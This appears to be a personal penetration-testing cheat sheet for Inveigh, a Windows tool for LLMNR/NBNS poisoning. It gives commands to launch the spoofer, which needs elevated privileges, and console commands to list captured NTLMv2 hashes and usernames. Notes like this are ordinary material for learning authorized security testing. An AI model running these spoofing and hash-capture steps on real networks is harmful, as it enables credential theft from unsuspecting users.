---
type: tool
category: networking-ad
tags:
  - tool
---
# Overview
`Inveigh` is the windows alternative for `Responder`
https://github.com/Kevin-Robertson/Inveigh/releases#release-v2.0.11
## Quick Commands `Elevated Privileges needed!`

### C
#### Windows Default (Inveigh)
Download and execute `Inveigh`: https://github.com/Kevin-Robertson/Inveigh/releases#release
```powershell
.\Inveigh.exe
```
Check important parameters here: [[Inveigh#C]]
### Powershell-Module

#### Windows LLMNR-Poisoning (Inveigh)
1. Download `Inveigh` to target and import `Powershell Module`:
```powershell
Import-Module .\Inveigh.ps1
```
2. Start `LLMNR` and `NBNS` sppofing, output to the console and write to a file:
```powershell
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```


## Important Parameter

### C
After starting the tool:
	`HELP` = shows available console commands
	`GET NTLMV2UNIQUE` = show unique captured hashes, like "NTLMv2"
	`GET NTLMV2USERNAMES` = list caputred (NTLMv2-)users
### Powershell-Module
 List Parameters/Options
```powershell
(Get-Command Invoke-Inveigh).Parameters
```